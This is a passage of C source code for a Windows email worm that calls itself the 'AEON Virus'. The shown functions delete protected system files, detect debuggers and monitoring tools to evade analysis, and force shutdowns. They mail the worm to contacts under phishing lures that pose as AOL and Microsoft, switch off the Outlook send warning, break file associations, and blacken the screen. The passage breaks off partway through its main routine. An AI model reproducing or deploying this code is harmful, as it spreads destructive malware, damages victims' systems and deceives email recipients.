						"subst.exe", "svchost.exe", "syncapp.exe", "sysedit.exe", "syskey.exe", "sysocmgr.exe", "systray.exe", "taskman.exe",
						"taskmgr.exe", "tcmsetup.exe", "tcpsvcs.exe", "telnet.exe", "tftp.exe", "tracert6.exe", "tracert.exe",
						"tscon.exe", "tscupgrd.exe", "tsdiscon.exe", "tskill.exe", "tsshutdn.exe", "unlodctr.exe", "upnpcont.exe", "ups.exe",
						"user.exe", "userinit.exe", "utilman.exe", "uWDF.exe", "verifier.exe", "vssadmin.exe", "vssvc.exe", "w32tm.exe",
						"WdfMgr.exe", "wextract.exe", "wiaacmgr.exe", "winchat.exe", "winmine.exe", "winmsd.exe", "winspool.exe",
						"winver.exe", "wjview.exe", "wmpstub.exe", "wowdeb.exe", "wowexec.exe", "wpabaln.exe", "wpdshextautoplay.exe",
						"wpnpinst.exe", "write.exe", "wscntfy.exe", "wscript.exe", "wuauclt.exe", "WudfHost.exe", "wupdmgr.exe", "xcopy.exe", 0};

/* A function deleting SFC protected files by deleting them everywhere on the PC:
	- %windir%\ServicePackFiles\i386
	- %windir%
	- %windir%\system32
	- %windir%\system32\dllcache
*/
void DeleteFileName(char *szFileName)
{
	char szWinDir1[MAX_PATH];
	char szWinDir2[MAX_PATH];
	char szWinDir3[MAX_PATH];
	char szWinDir4[MAX_PATH];

	/* %windir\ServicePackFiles\i386\<FILENAME> */
	GetWindowsDirectory(szWinDir1, sizeof(szWinDir1));
	strcat_s(szWinDir1, MAX_PATH, "\\ServicePackFiles\\i386\\");
	strcat_s(szWinDir1, MAX_PATH, szFileName);

	/* %windir%\<FILENAME> */
	GetWindowsDirectory(szWinDir2, sizeof(szWinDir2));
	strcat_s(szWinDir2, MAX_PATH, "\\");
	strcat_s(szWinDir2, MAX_PATH, szFileName);

	/* %windir%\system32\<FILENAME> */
	GetWindowsDirectory(szWinDir3, sizeof(szWinDir3));
	strcat_s(szWinDir3, MAX_PATH, "\\system32\\");
	strcat_s(szWinDir3, MAX_PATH, szFileName);

	/* %windir%\system32\dllcache\<FILENAME> */
	GetWindowsDirectory(szWinDir4, sizeof(szWinDir4));
	strcat_s(szWinDir4, MAX_PATH, "\\system32\\dllcache\\");
	strcat_s(szWinDir4, MAX_PATH, szFileName);

	/* Delete one file after the other */
	DeleteFile(szWinDir1);
	DeleteFile(szWinDir2);
	DeleteFile(szWinDir3);
	DeleteFile(szWinDir4);
}

/* Drop a batch file displaying a short message and keeping it open (" pause "), will be executed 10 times */
void DropAndExecuteBatch(void)
{
	HANDLE hFile;
	DWORD dwNumberOfBytesWritten;
	char szSysDirFile[MAX_PATH];
	int i;

	/* Batch script displaying some information and keeping opened because of the " pause " command */
	char szBatch[] = "@echo off\r\n"
						"echo ======================\r\n"
						"echo === [ AEON Virus ] ===\r\n"
						"echo ======================\r\n"
						"echo Author: SkyOut\r\n"
						"echo Team: [Electrical Ordered Freedom] [EOF]\r\n"
						"echo Date: 2006\r\n"
						"pause";

	/* %sysdir%\Aeon.bat */
	GetSystemDirectory(szSysDirFile, sizeof(szSysDirFile));
	strcat_s(szSysDirFile, MAX_PATH, "\\Aeon.bat");

	/* Create the batch file */
	hFile = CreateFile(szSysDirFile, GENERIC_WRITE|GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, szBatch, sizeof(szBatch), &dwNumberOfBytesWritten, NULL);
	CloseHandle(hFile);

	/* Make it hidden */
	SetFileAttributes(szSysDirFile, FILE_ATTRIBUTE_HIDDEN);

	/* Execute it ten times */
	for (i = 0; i < 10; i++)
	{
		ShellExecute(NULL, "open", szSysDirFile, NULL, NULL, SW_NORMAL);
	}
}

/* check for SoftIce by Registry key and checking if the driver is loaded in memory */
BOOL IsSoftIcePresent(void)
{
	HANDLE hFile;
	HKEY hKey;

	/* Check the registry key */
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\SoftICE", 0, KEY_QUERY_VALUE, &hKey);

	if (hKey != ERROR_SUCCESS)
	{
		/* SoftIce found */
		return 1;
	}

	/* check if the driver is loaded in the memory */
	hFile = CreateFile("\\\\.\\SICE", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		/* SoftIce found */
		return 1;
	}

	/* SoftIce not found */
	return 0;
}

/* Check for OllyDbg by its window handle */
BOOL IsOllyDbgPresent(void)
{
	HANDLE hWnd;

	/* Search for a window with a title " OllyDbg " */
	hWnd = FindWindow(NULL, "OllyDbg");

	if (hWnd != NULL)
	{
		/* OllyDbg found */
		return 1;
	}

	/* OllyDbg not found */
	return 0;
}

/* Checking for FileMon by checking if the driver is loaded in memory and by searching for the window handle */
BOOL IsFileMonPresent(void)
{
	HANDLE hFile;
	HANDLE hWnd;

	/* check if the driver is loaded in the memory */
	hFile = CreateFile("\\\\.\\FILEVXD", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		/* FileMon found */
		return 1;
	}

	/* Search for a window with a title " File Monitor ... " */
	hWnd = FindWindow(NULL, "File Monitor - Sysinternals: www.sysinternals.com");

	if (hWnd != NULL)
	{
		/* FileMon found */
		return 1;
	}

	/* FileMon not found */
	return 0;
}

/* Checking for RegMon by checking if the driver is loaded in memory and by searching for the window handle */
BOOL IsRegMonPresent(void)
{
	HANDLE hFile;
	HANDLE hWnd;

	/* Check if the driver is loaded in the memory */
	hFile = CreateFile("\\\\.\\REGVXD", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		/* RegMon found */
		return 1;
	}

	/* Search for a window with a title " Registry Monitor ... " */
	hWnd = FindWindow(NULL, "Registry Monitor - Sysinternals: www.siliconrealms.com");

	if (hWnd != NULL)
	{
		/* RegMon found */
		return 1;
	}

	/* RegMon not found */
	return 0;
}

/* Gain the needed priviliges and force to shut down system */
void SystemShutdown(void)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid); 
 
	tkp.PrivilegeCount = 1;  
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
 
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	/* After getting all needed privileges force Windows to shutdown */
	ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0);
}

/* Function to send the Emails, getting special values: subject, text and the name of the attached file */
void SendMail(char *szAddress, LPMAPISENDMAIL SendM, LHANDLE lhSession, char *szVirPath, char *szSubject, char *szText, char *szAttName) 
{
	/* Build our Email */
	MapiRecipDesc *RecipD  = (MapiRecipDesc *)malloc(sizeof(MapiRecipDesc));
	 
	/* Build the attachment out of the virus path %sysdir%\Aeon.exe, but with a specified name (szAttName) */
	MapiFileDesc Attachment = { 0, 0, (ULONG)-1, szVirPath, szAttName, NULL};
	
	/* Set Message options, Subject (szSubject) and Text (szText) */
	MapiMessage Message = {0, 
						szSubject,
						szText, 
						NULL, NULL, NULL, 0, NULL,1, RecipD, 1, &Attachment};
                
	/* Set Email options */
	RecipD->ulReserved = 0;
    RecipD->ulRecipClass = MAPI_TO;
    RecipD->lpszName     = szAddress;
    RecipD->lpszAddress  = szAddress;
    RecipD->ulEIDSize    = 0;
    RecipD->lpEntryID    = NULL;
        
	/* Send the Email finally */
	SendM(lhSession, 0L, &Message, 0L, 0L); 

	/* Make the memory we used free again */
	free(RecipD);
}

/* Function being called by CreateThread() later spreading the virus via Email (Outlook), subject/text/attachement name are depending on date */
DWORD WINAPI MailMySelf(void)
{
    MapiMessage *lpMessage;
	HINSTANCE hInst;
    LPMAPILOGON MAPILogon;
    LPMAPIFINDNEXT MAPIFindNext;
    LPMAPIREADMAIL MAPIReadMail;
    LPMAPISENDMAIL MAPISendMail;
    LPMAPILOGOFF MAPILogoff;
    LHANDLE lhSession;
	SYSTEMTIME stTime;
	char MsgID[513];
	char szAeonAtt[MAX_PATH];
	char szSubject[MAX_PATH];
	char szText[MAX_PATH];
	char szAttName[MAX_PATH];
	char szDate[MAX_PATH];

	/* Get the system time */
	GetSystemTime(&stTime);
	/* Saving in a format only telling day (1, 2, 3...) */
	GetDateFormat(LOCALE_USER_DEFAULT, 0, &stTime, "dd", szDate, sizeof(szDate));

	/* Now the Subject, Text, Attachment Name depend on the day */
	if ((stTime.wDay == 1) | (stTime.wDay == 8) | (stTime.wDay == 15) | (stTime.wDay == 22) | (stTime.wDay == 29))
	{
		strcpy_s(szSubject, MAX_PATH, "AOL (American Online) Information Email");
		strcpy_s(szText, MAX_PATH, "Dear User, \r\n\r\n \
									AOL is redesigning its inner structure this year, our aim is to become a more open \r\n \
									company and we want to provide new services around next month, offering free email accounts, \r\n \
									free webspace and more. If you are still a customer of us or if you are interested in one of those \r\n \
									benefits you can look into the attachement for more information. In a short time the program enables you \r\n \
									to get the advantages of our new services. \r\n\r\n \
									For any feedback you can contact AOL directly by Email: support@aol.com \r\n\r\n \
									Best regards, \r\n American Online");
		strcpy_s(szAttName, MAX_PATH, "AOL.exe");
	}
	else if ((stTime.wDay == 2) | (stTime.wDay == 9) | (stTime.wDay == 16) | (stTime.wDay == 23) | (stTime.wDay == 30))
	{
		strcpy_s(szSubject, MAX_PATH, "Play a little game and win one of over 100 things");
		strcpy_s(szText, MAX_PATH, "Hello, \r\n\r\n \
								   In the attachment you can find a little game called \"MoMo\", it is very easy to play, \r\n \
								   and is really funny, the best thing is, try to get the highest highscore to win some interesting \r\n \
								   prices, it can be money or new technical products (computer, digital cameras and more), \r\n \
								   depends on the state you reach in the list of the best 100 users. Find out yourself and be the best! \r\n\r\n \
								   Good luck, \r\n K-lineComputer Inc.");
		strcpy_s(szAttName, MAX_PATH, "MoMo.exe");
	}
	else if ((stTime.wDay == 3) | (stTime.wDay == 10) | (stTime.wDay == 17) | (stTime.wDay == 24) | (stTime.wDay == 31))
	{
		strcpy_s(szSubject, MAX_PATH, "Happy New Year");
		strcpy_s(szText, MAX_PATH, "Hey, \r\n\r\n \
								   I am not sure if you can remember who I am, it has been a long time since we last met, \r\n \
								   but I have never forgot you =) Maybe in future we can meet again and go to some restaurant or \r\n \
								   similar things, but first of all I WISH YOU A HAPPY NEW YEAR, good luck for everything you want to try \r\n \
								   this year. In the attached file you can find a little gift from me and my new address I am living at the \r\n \
								   moment, hopefully you give it a try. \r\n \
								   Bye Bye friend");
		strcpy_s(szAttName, MAX_PATH, "NewYear.exe");
	}
	else if ((stTime.wDay == 4) | (stTime.wDay == 11) | (stTime.wDay == 18) | (stTime.wDay == 25) | (stTime.wDay == 5))
	{
		strcpy_s(szSubject, MAX_PATH, "Opening of a new restaurant");
		strcpy_s(szText, MAX_PATH, "Hello, \r\n\r\n \
								   Next monday will be the big opening of our new restaurant, it is an international place, \r\n \
								   where you can find new and exciting things to explore. The opening contains a little party \r\n \
								   and free drinks / food for everyone, we would like to see you and maybe some of your friends or \r\n \
								   family members there. If you are interested where to find us just look into the attachment. \r\n\r\n \
								   Best regards and hopefully seeing you next monday, \r\n \
								   The whole restaurant team.");
		strcpy_s(szAttName, MAX_PATH, "Invitation.exe");
	}
	else if ((stTime.wDay == 12) | (stTime.wDay == 19) | (stTime.wDay == 26) | (stTime.wDay == 6) | (stTime.wDay == 13))
	{
		strcpy_s(szSubject, MAX_PATH, "Information about our new online newspaper");
		strcpy_s(szText, MAX_PATH, "Hello, \r\n\r\n \
								   With some other people I plan to make a new online newspaper about political and everyday life \r\n \
								   topics. The first issue of this new newspaper is planned to be released next month and it would be \r\n \
								   a great help for us to get some feedback from people not involved in the production. In the attached \r\n \
								   file you can find the index page of our newspaper and you can write a comment if you like. \r\n\r\n \
								   Thanks in advance for doing it.");
		strcpy_s(szAttName, MAX_PATH, "Newspaper.exe");
	}
	else
	{
		strcpy_s(szSubject, MAX_PATH, "Microsoft: New worm attack! Patch included (KB987655)");
		strcpy_s(szText, MAX_PATH, "Dear Windows User, \r\n\r\n \
								   Since last week Microsoft is recognizing new worm attacks all over the world. Informed by several \r\n \
								   Anti-Virus company, like Kaspersky, Symantec and others we decided to bring out a patch for this as fast as \r\n \
								   possible. The risk to be infected is very high as the worm targets a problem in the network part of Windows, \r\n \
								   which means that no user action is needed to be infected. To stop a wider spreading of the destructive \r\n \
								   program and avoid yourself from any damage install the included patch fixing the problem. \r\n\r\n \
								   Best regards, \r\n Microsoft Security Team");
		strcpy_s(szAttName, MAX_PATH, "Patch.exe");
	}

	/* Load the needed MAPI library */
	if(!(hInst = LoadLibrary( "mapi32.dll" ))) 
		return 0;

	/* %sysdir%\Aeon.exe */
	GetSystemDirectory(szAeonAtt, sizeof(szAeonAtt));
	strcat_s(szAeonAtt, MAX_PATH, "\\Aeon.exe");

	/* Get the needed MAPI functions */
	MAPILogon = (LPMAPILOGON)GetProcAddress(hInst, "MAPILogon");
	MAPIFindNext = (LPMAPIFINDNEXT)GetProcAddress(hInst, "MAPIFindNext");       
	MAPIReadMail = (LPMAPIREADMAIL)GetProcAddress(hInst, "MAPIReadMail");        
	MAPISendMail = (LPMAPISENDMAIL)GetProcAddress(hInst, "MAPISendMail");		
	MAPILogoff = (LPMAPILOGOFF)GetProcAddress(hInst,"MAPILogoff");
 
	/* Check if all functions can be used, break if one or more can not be used */
	if( MAPILogon == NULL || MAPIFindNext == NULL || MAPIReadMail == NULL || MAPISendMail == NULL || MAPILogoff == NULL) 
		return 0;

	/* Try to log in */
	if(MAPILogon(0, NULL, NULL, 0, 0, &lhSession) == SUCCESS_SUCCESS)
	{ 
		while(1)
        {
			/* Find new Mail and check for success*/
			if(MAPIFindNext(lhSession, 0L, NULL, MsgID, MAPI_LONG_MSGID, 0L, MsgID) != SUCCESS_SUCCESS) 
				break;
			/* Read the Mail and check for success*/
			if( MAPIReadMail(lhSession, 0L, MsgID, MAPI_PEEK, 0L, &lpMessage) == SUCCESS_SUCCESS) 
				/* Send the Mail */
				SendMail(lpMessage->lpOriginator->lpszAddress, MAPISendMail, lhSession, szAeonAtt, szSubject, szText, szAttName);
		}
		/* Log out */
		MAPILogoff(lhSession, 0L, 0L, 0L);
	 }
	/* Free the library */
	FreeLibrary(hInst);
	return 1;
}

/* Disable the MAPI Warning when sending the Emails, thanks to Tamiami, DiA, RRLF #7 */
DWORD DisableMAPIWarning(void)
{
	HKEY hKey1;
	HKEY hKey2;
	DWORD dwDefaultUserSize;
	DWORD dwWarnDisable = 0;
	char szDefaultUserID[MAX_PATH];

	/* Set HKEY_CURRENT_USER\Identities\{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\Software\Microsoft\Outlook Express\5.0\Mail (where
	X stands for a number or letter, depending on the system) " Warn on Mapi Send " = " 0x00000000 (0) " */
	if(RegOpenKeyEx(HKEY_CURRENT_USER, "Identities", 0, KEY_QUERY_VALUE, &hKey1) == ERROR_SUCCESS)
	{
		if(RegQueryValueEx(hKey1, "Default User ID", 0, 0, (BYTE *)&szDefaultUserID, &dwDefaultUserSize) == ERROR_SUCCESS)
		{
			if(lstrcat(szDefaultUserID, "\\Software\\Microsoft\\Outlook Express\\5.0\\Mail") != 0)
			{
				if(RegOpenKeyEx(hKey1, szDefaultUserID, 0, KEY_SET_VALUE, &hKey2) == ERROR_SUCCESS)
				{
					RegSetValueEx(hKey2, "Warn on Mapi Send", 0, REG_DWORD, (BYTE *)&dwWarnDisable, sizeof(dwWarnDisable));
					
					RegCloseKey(hKey2);
					RegCloseKey(hKey1);

					return 1;
				}
			}
		}
		RegCloseKey(hKey1);
	}
	return 0;
}

/* Modify HKEY_CLASSES_ROOTS file associations for all important file types, after this double clicking a file will result in an error message */
void ModifyHCR(void)
{
	RegDeleteKey(HKEY_CLASSES_ROOT, "ACLfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "acwfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "AIFFFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "ASFFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "aspfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "ASXFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "AUFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "AVIFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "batfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "CATFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "cdafile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "ChatFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "cmh.file\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "clpfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "cmdfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "comfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "CompressedFolder\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "ConferenceLink\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "cplfile\\shell\\cplopen\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "dbile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "divfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "divxfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "dllfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "dpsfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "dunfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "dxufile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "emfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "exefile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "Folder\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "fonfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "giffile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "h323file\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "helpfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "hlpfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "htfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "htmlfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "HTTP\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "https\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "ICY\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "iiifile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "inffile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "inifile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "irc\\Shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "jarfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "jpegfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "JSFile\\Shell\\Open\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "JSEFile\\Shell\\Open\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "JSXFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "mailto\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "mhtmlfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "MIDFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "MMS\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "MMST\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "MMSU\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "movfile\\Shell\\Open\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "mp3file\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "mpegfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "msbackupfile\\Shell\\Open\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "MSBD\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "MSCFile\\Shell\\Open\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "news\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "nntp\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "otffile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "pbkfile\\shell\\Open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "PerfFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "pfmfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "piffile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "pjpegfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "pngfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "pnm\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "ppifile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "prffile\\Shell\\Open\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "rar_auto_file\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "ratfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "regedit\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "regfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "rlogin\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "rnkfile\\shell\\Connect\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "rnkfile\\shell\\Disconnect\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "rtffile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "rtsp\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "SC\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "scrfile\\shell\\open\\config");
	RegDeleteKey(HKEY_CLASSES_ROOT, "scrfile\\shell\\open\\install");
	RegDeleteKey(HKEY_CLASSES_ROOT, "scrfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "scriptletfile\\Shell\\Open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "sh_auto_file\\shell\\edit\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "sh_auto_file\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "Shell\\shell\\explore\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "Shell\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "SHOUT\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "skype\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "snews\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "SoundRec\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "SSM\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "steam\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "telnet\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "themefile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "tn3270\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "torrent\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "ttcfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "ttffile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "txtfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "ulsfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "UNSV\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "UVOX\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "VBEFile\\Shell\\Open\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "VBEFile\\shell\\Open2\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "VBSFile\\Shell\\Open\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "VBSFile\\shell\\Open2\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "webpnpFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "Whiteboard\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "wmffile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "WMVFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "WMZFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "WPLFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "wrifile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "WSFFile\\Shell\\Open\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "WSFFile\\Shell\\Open2\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "WSHFile\\Shell\\Open\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "WSHFile\\Shell\\Open2\\Command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "WVXFile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "xbmfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "xmlfile\\shell\\open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "xslfile\\shell\\Open\\command");
	RegDeleteKey(HKEY_CLASSES_ROOT, "zapfile\\shell\\open\\command");
}

/* Change every system color to black (00, 00, 00), reading anything or working normally is impossible until this is changed */
void BlackSystem(void)
{
	/* Array of ALL color values */
	int iElements[] = {COLOR_3DDKSHADOW, COLOR_3DFACE, COLOR_3DHIGHLIGHT, COLOR_3DHILIGHT, COLOR_3DLIGHT,
						COLOR_3DSHADOW, COLOR_ACTIVEBORDER, COLOR_ACTIVECAPTION, COLOR_APPWORKSPACE, COLOR_BACKGROUND,
						COLOR_BTNFACE, COLOR_BTNHIGHLIGHT, COLOR_BTNSHADOW, COLOR_BTNTEXT, COLOR_CAPTIONTEXT, COLOR_DESKTOP,
						COLOR_GRADIENTACTIVECAPTION, COLOR_GRADIENTINACTIVECAPTION, COLOR_GRAYTEXT, COLOR_HIGHLIGHT, COLOR_HIGHLIGHTTEXT,
						COLOR_HOTLIGHT, COLOR_INACTIVEBORDER, COLOR_INACTIVECAPTION, COLOR_INACTIVECAPTIONTEXT, COLOR_INFOBK,
						COLOR_INFOTEXT, COLOR_MENU, COLOR_MENUHILIGHT, COLOR_MENUBAR, COLOR_MENUTEXT, COLOR_SCROLLBAR,
						COLOR_WINDOW, COLOR_WINDOWFRAME, COLOR_WINDOWTEXT};

	/* Black */
	DWORD dwBlack[] = {RGB(0, 0, 0)};
 
	/* Blacken the system colors */
	SetSysColors(35, iElements, dwBlack); 

	/* Blank the desktop Wallpaper (Black) */
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, " ", 0);
}

/* Junk code function which can be used to make debugging more complicate and annoying,
not used in the virus, but just try by doing some jnk() calls (important: only use this function when
a debugger is found !) example usage " if (bSoftIce == 1) { jnk(); } "*/
void jnk(void)
{
	__asm {jmp $+4}
	__asm {int 20h}
}

/* ========= MAIN CODE ========= MAIN CODE ========= MAIN CODE ========= MAIN CODE ========= */

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	HANDLE hWnd;
	SYSTEMTIME stTime;
	BOOL bInfected;
	BOOL bSoftIce;
	BOOL bOllyDbg;
	BOOL bFileMon;
	BOOL bRegMon;
	DWORD dwThreadID;
	char szDate[MAX_PATH];
	int i;

	/* Wait 5 minutes before doing something */
	Sleep(300000);

	/* Create a mutex to make sure the worm is only running one time */
	CreateMutex(NULL, FALSE, "AEON");

	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		ExitProcess(0);
	}

	/* Check for SoftIce/OllyDbg/FileMon/RegMon */
	bSoftIce = IsSoftIcePresent();
	bOllyDbg = IsOllyDbgPresent();
